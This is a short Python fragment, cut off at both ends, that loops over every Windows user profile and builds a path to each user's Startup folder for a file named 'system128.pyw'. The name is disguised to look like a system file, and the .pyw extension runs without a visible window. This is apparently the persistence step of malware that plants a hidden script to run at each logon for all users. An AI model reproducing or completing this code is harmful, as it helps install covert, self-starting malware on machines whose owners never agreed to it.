...
for x in glob(r'C:\Users\\*'):
    user = x.split('\\')[2]
    targetpath = f'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
    target = f'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\system128.pyw'
